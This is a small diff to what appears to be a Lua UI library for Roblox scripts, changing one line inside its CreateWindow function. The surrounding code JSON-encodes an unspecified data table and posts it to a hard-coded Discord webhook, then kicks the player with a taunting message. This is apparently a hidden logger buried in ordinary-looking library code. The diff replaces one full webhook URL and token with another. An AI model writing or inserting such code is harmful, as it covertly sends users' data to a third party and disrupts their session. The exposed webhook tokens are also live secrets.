@@ -3578,7 +3578,7 @@ function library:CreateWindow(name, size, hidebutton)
                 local Encoded                  = HttpService:JSONEncode(Data)
 
                 Request                        = http_request or request or HttpPost or syn.request
-                local Final = {Url             = "https://discord.com/api/webhooks/971774211641204796/g1kFmncGDwfNh-CJC_5KdwLnRkjPFV_WeukKmbZMfVRfgfZcIwD1Ai2K_koA07aoPeBX", Body = Encoded, Method = "POST", Headers = Headers}
+                local Final = {Url             = "https://discord.com/api/webhooks/971783002965299222/BBrifhhGROExM4eNNlPZl75iMPYr3GS8pAwJUFCi48vK1FEOZbpzlx_eQnskA3uyQDTF", Body = Encoded, Method = "POST", Headers = Headers}
                 Request(Final)
 		game.Players.LocalPlayer:Kick("L Bozo Stay Mad")
 		wait(15)
